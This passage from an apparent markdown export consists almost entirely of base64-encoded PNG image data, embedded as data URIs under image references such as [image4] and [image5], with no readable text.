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>

[image4]: <data:image/png;base64,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>

[image5]: <data:image/png;base64,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